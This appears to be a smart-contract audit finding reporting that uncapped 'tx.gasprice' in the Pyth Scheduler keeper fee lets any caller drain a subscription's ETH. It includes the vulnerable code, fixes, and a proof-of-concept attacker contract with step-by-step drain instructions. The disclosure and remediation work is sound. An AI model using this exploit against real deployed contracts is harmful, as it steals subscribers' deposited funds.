### Title
Unbounded `tx.gasprice` in Keeper Fee Calculation Allows Subscription Balance Drain — (`File: target_chains/ethereum/contracts/contracts/pulse/Scheduler.sol`)

### Summary
The `Scheduler._processFeesAndPayKeeper()` function computes the keeper fee as `(startGas - gasleft() + GAS_OVERHEAD) * tx.gasprice` with no upper bound on `tx.gasprice`. Because `updatePriceFeeds()` is permissionless, any caller acting as a keeper can set an arbitrarily high gas price to drain a subscription's entire ETH balance in a single call, analogous to the Omnipool sandwich attack where infinite Balancer limits allow any exchange rate to be accepted.

---

### Finding Description

`Scheduler.updatePriceFeeds()` is callable by any address (no access control). At the end of every successful call it invokes `_processFeesAndPayKeeper()`:

```solidity
// Scheduler.sol
function _processFeesAndPayKeeper(
    SchedulerStructs.SubscriptionStatus storage status,
    uint256 startGas,
    uint256 numPriceIds
) internal {
    uint256 gasCost = (startGas - gasleft() + GAS_OVERHEAD) * tx.gasprice;
    uint256 keeperSpecificFee = uint256(_state.singleUpdateKeeperFeeInWei)
        * numPriceIds;
    uint256 totalKeeperFee = gasCost + keeperSpecificFee;

    if (status.balanceInWei < totalKeeperFee) {
        revert SchedulerErrors.InsufficientBalance();
    }

    status.balanceInWei -= totalKeeperFee;
    status.totalSpent   += totalKeeperFee;

    (bool sent, ) = msg.sender.call{value: totalKeeperFee}("");
    if (!sent) revert SchedulerErrors.KeeperPaymentFailed();
}
```

`tx.gasprice` is entirely attacker-controlled and has no cap. The only guard is that `totalKeeperFee` must not exceed `status.balanceInWei`, so the attacker simply chooses a gas price that makes `totalKeeperFee` equal to (or just below) the full subscription balance.

The parallel to the Omnipool bug is exact:

| Omnipool | Scheduler |
|---|---|
| `limits[i] = type(int256).max` — accepts any exchange rate | No `maxGasPrice` cap — accepts any `tx.gasprice` |
| Attacker manipulates pool price before victim's swap | Attacker sets `tx.gasprice` to drain subscription |
| Victim loses up to 100 % of rewards | Subscriber loses up to 100 % of deposited ETH | [1](#0-0) 

---

### Impact Explanation

A malicious keeper (any EOA or contract) calls `updatePriceFeeds()` with a `tx.gasprice` chosen so that:

```
(actualGasUsed + GAS_OVERHEAD) * tx.gasprice ≈ status.balanceInWei
```

The subscription's entire ETH balance is transferred to the keeper. The subscription then falls below the minimum balance and is effectively bricked. The subscriber loses all deposited funds.

If the keeper is also the block producer (or uses a private relay / flashbots bundle), the high gas fee paid to the block is recaptured, making the net profit equal to the full subscription balance minus the small `singleUpdateKeeperFeeInWei` component.

---

### Likelihood Explanation

- `updatePriceFeeds()` has no access control; any address is a valid keeper.
- Setting `tx.gasprice` is a standard EVM transaction parameter requiring no special privilege.
- Block builders / validators routinely accept private bundles, making gas-price manipulation trivially achievable on all EVM chains where Scheduler is deployed.
- Subscriptions with large balances (e.g., permanent subscriptions funded with significant ETH) are high-value targets. [2](#0-1) 

---

### Recommendation

1. **Cap `tx.gasprice`**: Introduce a configurable `maxGasPriceInWei` parameter and clamp the effective gas price:
   ```solidity
   uint256 effectiveGasPrice = tx.gasprice < _state.maxGasPriceInWei
       ? tx.gasprice
       : _state.maxGasPriceInWei;
   uint256 gasCost = (startGas - gasleft() + GAS_OVERHEAD) * effectiveGasPrice;
   ```
2. **Cap total keeper fee**: Enforce a maximum keeper fee per update (e.g., a multiple of `singleUpdateKeeperFeeInWei`) so that gas-price manipulation cannot extract more than a bounded amount per call.
3. **Allowlist keepers**: Restrict `updatePriceFeeds()` to a set of trusted keeper addresses, eliminating the permissionless attack surface entirely.

---

### Proof of Concept

```solidity
// Attacker contract
contract MaliciousKeeper {
    IScheduler scheduler;

    constructor(address _scheduler) {
        scheduler = IScheduler(_scheduler);
    }

    // Called with tx.gasprice set to drain the target subscription
    function drain(
        uint256 subscriptionId,
        bytes[] calldata updateData,
        uint256 targetGasPrice   // chosen off-chain to equal balance / (gasUsed + GAS_OVERHEAD)
    ) external {
        // Submit via a private bundle so the high gas price is recaptured
        // tx.gasprice == targetGasPrice (set by the bundle)
        scheduler.updatePriceFeeds(subscriptionId, updateData);
        // _processFeesAndPayKeeper pays address(this) ≈ full subscription balance
    }

    receive() external payable {}
}
```

Steps:
1. Observe a subscription with balance `B` wei.
2. Estimate `gasUsed` for `updatePriceFeeds` (e.g., via `eth_estimateGas`).
3. Compute `targetGasPrice = (B - singleUpdateKeeperFeeInWei * numFeeds) / (gasUsed + GAS_OVERHEAD)`.
4. Submit the transaction via a private relay with `gasPrice = targetGasPrice`.
5. `_processFeesAndPayKeeper` pays `totalKeeperFee ≈ B` to the attacker; the subscription balance drops to near zero. [3](#0-2)

    function updatePriceFeeds(
        uint256 subscriptionId,
        bytes[] calldata updateData
    ) external override {
        uint256 startGas = gasleft();

        SchedulerStructs.SubscriptionStatus storage status = _state
            .subscriptionStatuses[subscriptionId];
        SchedulerStructs.SubscriptionParams storage params = _state
            .subscriptionParams[subscriptionId];

        if (!params.isActive) {
            revert SchedulerErrors.InactiveSubscription();
        }

        // Get the Pyth contract and parse price updates
        IPyth pyth = IPyth(_state.pyth);
        uint256 pythFee = pyth.getUpdateFee(updateData);

        // If we don't have enough balance, revert
        if (status.balanceInWei < pythFee) {
            revert SchedulerErrors.InsufficientBalance();
        }

        // Parse the price feed updates with an acceptable timestamp range of [0, now+10s].
        // Note: We don't want to reject update data if it contains a price
        // from a market that closed a few days ago, since it will contain a timestamp
        // from the last trading period. Thus, we use a minimum timestamp of zero while parsing,
        // and we enforce the past max validity ourselves in _validateShouldUpdatePrices using
        // the highest timestamp in the update data.
        status.balanceInWei -= pythFee;
        status.totalSpent += pythFee;
        uint64 curTime = SafeCast.toUint64(block.timestamp);
        (
            PythStructs.PriceFeed[] memory priceFeeds,
            uint64[] memory slots
        ) = pyth.parsePriceFeedUpdatesWithConfig{value: pythFee}(
                updateData,
                params.priceIds,
                0, // We enforce the past max validity ourselves in _validateShouldUpdatePrices
                curTime + FUTURE_TIMESTAMP_MAX_VALIDITY_PERIOD,
                false,
                true,
                false
            );

        // Verify all price feeds have the same Pythnet slot.
        // All feeds in a subscription must be updated at the same time.
        uint64 slot = slots[0];
        for (uint8 i = 1; i < slots.length; i++) {
            if (slots[i] != slot) {
                revert SchedulerErrors.PriceSlotMismatch();
            }
        }

        // Verify that update conditions are met, and that the timestamp
        // is more recent than latest stored update's. Reverts if not.
        uint256 latestPublishTime = _validateShouldUpdatePrices(
            subscriptionId,
            params,
            status,
            priceFeeds
        );

        // Update status and store the updates
        status.priceLastUpdatedAt = latestPublishTime;
        status.totalUpdates += priceFeeds.length;

        _storePriceUpdates(subscriptionId, priceFeeds);

        _processFeesAndPayKeeper(status, startGas, params.priceIds.length);

        emit PricesUpdated(subscriptionId, latestPublishTime);
    }
